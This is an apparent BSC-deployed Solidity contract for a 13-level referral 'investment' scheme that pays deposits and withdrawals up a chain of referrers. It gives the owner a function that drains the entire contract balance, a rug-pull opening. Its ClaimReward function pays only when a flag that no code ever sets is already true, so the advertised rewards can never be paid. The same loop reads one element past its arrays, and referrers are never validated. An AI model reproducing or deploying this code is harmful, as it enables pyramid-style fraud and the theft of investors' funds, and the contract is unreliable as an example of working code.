/**
 *Submitted for verification at BscScan.com on 2022-11-22
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.7;

contract Matic {
    uint256 IdProvider = 4000;
    address owner;

    uint256[]  InvestmentPercentage = [
        100,
        50,
        40,
        30,
        20,
        10,
        10,
        10,
        10,
        5,
        5,
        5,
        5
    ];
    uint256[]  WithdrawPercentage = [
        150,
        100,
        80,
        60,
        30,
        30,
        30,
        30,
        30,
        30,
        70,
        80,
        80
    ];
    uint32 PercentDivider = 1000;
    struct userDetail {
        uint256 userID;
        address Useraddress;
        address UserrefferedBy;
        uint256 UserTotalWthdrwal;
        uint256 userLastWithdrwal;
        uint256 userTotalInvestment;
        uint256 userlastTimeInvestment;
        uint256 userRemainingInvestment;
        uint256 userDirectReferalEarnings;
        uint256 userTeamreferalEarnings;
        uint256[] userAmount;
        uint256[] TimeInvested;
        bool[] IsWithdarawl;
    }

    mapping(address => userDetail) public UserAllDetailByAddress;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    event InvestmentDetail( address Buyer,address RefferedBy, uint256 AmountInvetsed );
    event withdrawDetail( address WithdarawalBy , uint256 Amount);

    constructor() public {
        owner = msg.sender;
    }

    function Invest(uint256 _amount, address _ReferdBy) public payable {
        require(
            msg.value >= _amount,
            "Amount Transfer Issues Please check Issue"
        );
     
        if (UserAllDetailByAddress[msg.sender].userID != 0) {
            UserAllDetailByAddress[msg.sender].userID = UserAllDetailByAddress[
                msg.sender
            ].userID;
        } else {
            UserAllDetailByAddress[msg.sender].userID = IdProvider;
            IdProvider++;
        }

        UserAllDetailByAddress[msg.sender].Useraddress = msg.sender;
        UserAllDetailByAddress[msg.sender].UserrefferedBy = _ReferdBy;
        UserAllDetailByAddress[msg.sender].userTotalInvestment += _amount;
        UserAllDetailByAddress[msg.sender].userlastTimeInvestment = _amount;
        UserAllDetailByAddress[msg.sender].userRemainingInvestment += _amount;
        UserAllDetailByAddress[_ReferdBy].userDirectReferalEarnings += _amount;

        UserAllDetailByAddress[msg.sender].userAmount.push(_amount);
        UserAllDetailByAddress[msg.sender].TimeInvested.push(block.timestamp);
        UserAllDetailByAddress[msg.sender].IsWithdarawl.push(false);

        emit InvestmentDetail(msg.sender,_ReferdBy,_amount);

        address _referrer = UserAllDetailByAddress[msg.sender].UserrefferedBy;
        for (uint8 i = 0; i < 13; i++) {
            if (_referrer != address(0)) {
                payable(_referrer).transfer(
                    (_amount * InvestmentPercentage[i]) / PercentDivider
                );
                UserAllDetailByAddress[_referrer]
                    .userTeamreferalEarnings += _amount;

                if (
                    UserAllDetailByAddress[_referrer].UserrefferedBy !=
                    address(0)
                ) _referrer = UserAllDetailByAddress[_referrer].UserrefferedBy;
                else break;
            }
        }
    }

    function withdrawAmount(uint256 _amount) public {
        require(
            _amount <=
                UserAllDetailByAddress[msg.sender].userRemainingInvestment,
            "insufficient Balance To withdraw "
        );

        uint256 Amount;

        uint256 bal = ((_amount * 80) / 100);
        payable(msg.sender).transfer(bal);

        uint256 refBalance = _amount - bal;
        Amount = refBalance;
        refBalance = (refBalance * 80) / 100;

            emit withdrawDetail(msg.sender,_amount);

        address _referrer = UserAllDetailByAddress[msg.sender].UserrefferedBy;
        for (uint8 i = 0; i < 13; i++) {
            if (_referrer != address(0)) {
                payable(_referrer).transfer(
                    (refBalance * WithdrawPercentage[i]) / PercentDivider
                );
                if (
                    UserAllDetailByAddress[_referrer].UserrefferedBy !=
                    address(0)
                ) _referrer = UserAllDetailByAddress[_referrer].UserrefferedBy;
                else break;
            }
        }

        uint256 adminwallet = ((Amount * 20) / 100);
        payable(owner).transfer(adminwallet);

        UserAllDetailByAddress[msg.sender].userLastWithdrwal = _amount;
        UserAllDetailByAddress[msg.sender].UserTotalWthdrwal += _amount;
        UserAllDetailByAddress[msg.sender].userRemainingInvestment =
            UserAllDetailByAddress[msg.sender].userRemainingInvestment -
            _amount;
    }

    function GetUsertotalInvestment() public view returns (uint256[] memory) {
        return UserAllDetailByAddress[msg.sender].userAmount;
    }

    function GetUsertotalTimeOfInvestment()
        public
        view
        returns (uint256[] memory)
    {
        return UserAllDetailByAddress[msg.sender].TimeInvested;
    }

    function GetUsertotalClaimedAmountDetail()
        public
        view
        returns (bool[] memory)
    {
        return UserAllDetailByAddress[msg.sender].IsWithdarawl;
    }

    function ClaimReward() public {
        for (
            uint8 i = 0;
            i <= UserAllDetailByAddress[msg.sender].userAmount.length;
            i++
        ) {
            if (
                UserAllDetailByAddress[msg.sender].TimeInvested[i] + 3456000 >=
                block.timestamp
            ) {
                if (
                    UserAllDetailByAddress[msg.sender].IsWithdarawl[i] == true
                ) {
                    uint256 ContractBalance = address(this).balance;
                    payable(msg.sender).transfer((ContractBalance * 15) / 1000);
                    UserAllDetailByAddress[msg.sender].IsWithdarawl[i] = true;
                    break;
                }
            } else if (
                UserAllDetailByAddress[msg.sender].TimeInvested[i] + 6912000 >=
                block.timestamp
            ) {
                if (
                    UserAllDetailByAddress[msg.sender].IsWithdarawl[i] == true
                ) {
                    uint256 ContractBalance = address(this).balance;
                    payable(msg.sender).transfer((ContractBalance * 25) / 1000);
                    UserAllDetailByAddress[msg.sender].IsWithdarawl[i] = true;
                    break;
                }
            } else if (
                UserAllDetailByAddress[msg.sender].TimeInvested[i] + 10368000 >=
                block.timestamp
            ) {
                if (
                    UserAllDetailByAddress[msg.sender].IsWithdarawl[i] == true
                ) {
                    uint256 ContractBalance = address(this).balance;
                    payable(msg.sender).transfer((ContractBalance * 35) / 1000);
                    UserAllDetailByAddress[msg.sender].IsWithdarawl[i] = true;
                    break;
                }
            }
        }
    }

    function TransferAmountToOwnerWallet() public payable onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        owner = newOwner;
    }

    receive() external payable {}
}